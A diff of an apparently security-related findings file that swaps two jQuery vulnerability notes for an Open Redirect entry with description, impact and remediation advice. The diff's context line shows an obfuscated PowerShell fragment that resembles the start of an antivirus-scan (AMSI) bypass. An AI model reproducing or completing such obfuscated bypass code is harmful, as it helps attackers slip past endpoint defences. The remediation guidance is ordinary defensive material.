@@ -36,7 +36,15 @@ S`eT-It`em('V'+'aR'+'IA'+('blE:1'+'q2')+('uZ'+'x'))([TYpE]("{1}{0}"-F'F','rE'));
 
 =============================================================
 
-jQuery versions >=1.2 and <3.5.0 may execute untrusted code if HTML from untrusted sources is passed to DOM manipulation methods (e.g., .html(), .append()).
+Open Redirect
+Description: Open Redirect vulnerabilities occur when an application improperly processes URLs, allowing attackers to redirect users to unintended, malicious websites. This can be exploited by tricking users into clicking on seemingly legitimate links that lead to phishing sites or other harmful destinations.
 
-jQuery before 3.4.0 mishandles jQuery.extend(true, {}, ...), allowing Object.prototype pollution if an unsanitized source object contains an enumerable proto property.
+Impact: An open redirect can lead to phishing attacks, loss of user trust, and the potential for users to be directed to malicious websites, resulting in credential theft, malware infections, and other security breaches.
+
+Remediation: Validate and sanitize all URLs and redirect parameters to ensure they only allow redirection to approved, trusted domains. Avoid using user-provided input directly for redirection without proper validation. Implement a whitelist of allowed URLs for redirection.
+
+Reference:
+
+OWASP Open Redirect
+One-liner recommendation: "It is recommended to validate and sanitize all URLs to ensure redirection only to trusted domains."
 
